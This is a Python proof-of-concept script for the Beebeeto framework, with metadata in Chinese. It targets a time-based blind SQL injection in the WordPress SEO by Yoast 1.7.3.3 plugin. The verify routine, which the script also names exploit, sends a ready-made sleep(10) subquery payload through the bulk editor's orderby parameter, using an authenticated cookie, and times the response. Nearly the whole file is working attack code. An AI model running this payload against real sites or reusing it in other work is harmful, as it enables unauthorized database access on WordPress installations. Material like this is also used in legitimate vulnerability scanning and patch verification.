#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import requests

from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0062',
            'name': 'WordPress SEO by Yoast 1.7.3.3 /admin/class-bulk-editor-list-table.php SQL注入漏洞 POC',
            'author': 'Evi1m0',
            'create_date': '2015-03-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['1.7.3.3'],
            'type': 'SQL Injection',
            'tag': ['WordPress SEO by Yoast漏洞', '/admin/class-bulk-editor-list-table.php', 'php'],
            'desc': '''
                    该漏洞仅影响WordPress内部用户，因为该漏洞存在于admin/class-bulk-editor-list-table.php文件中，
                    而此文件只有WordPress管理员、编辑和特权作者才能访问。
                    ''',
            'references': [
                    'http://thehackernews.com/2015/03/wordpress-seo-by-yoast-plugin.html',
                    'http://www.freebuf.com/news/60715.html',
            ],
        },
    }

    def _init_user_parser(self):
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                    'for target must be included in http headers.')


    @classmethod
    def verify(cls, args):
        fake_headers = ForgeHeaders().get_headers()
        fake_headers['Cookie'] = args['options']['cookie']
        payload = ("/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby="
                   "post_date%2c(select%20*%20from%20(select(sleep(10)))a)&order=asc")
        start = time.time()
        verify_url = args['options']['target'] + payload
        req = requests.post(verify_url, headers=fake_headers)
        if args['options']['verbose']:
            print '[+] Request:' + verify_url
        if time.time() - start > 10 and req.status_code == 200:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())